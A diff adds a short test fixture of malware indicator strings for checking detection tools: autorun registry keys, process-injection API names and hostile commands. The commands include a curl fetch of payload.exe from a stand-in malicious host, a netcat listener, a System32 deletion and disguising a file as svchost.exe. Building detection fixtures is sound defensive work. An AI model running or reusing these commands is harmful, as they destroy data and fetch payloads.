@@ -1,0 +1,35 @@
+This is a safe test file that contains suspicious strings commonly found in malware.
+These strings are used for testing detection capabilities:
+
+Registry Keys:
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+Network Indicators:
+cmd.exe /c ping 192.168.1.1
+powershell.exe -ExecutionPolicy Bypass
+nc -lvp 4444
+curl http://malicious-domain.example.com/payload.exe
+
+File Operations:
+del /f /s /q C:\Windows\System32\
+copy %0 C:\Windows\System32\svchost.exe
+attrib +h +s +r malware.exe
+
+Crypto Patterns:
+wallet.dat
+bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+-----BEGIN RSA PRIVATE KEY-----
+
+Process Injection:
+CreateRemoteThread
+VirtualAllocEx
+WriteProcessMemory
+SetWindowsHookEx
+
+Anti-Analysis:
+IsDebuggerPresent
+CheckRemoteDebuggerPresent
+NtQueryInformationProcess
+
+Note: This is a benign test file for security testing purposes only.
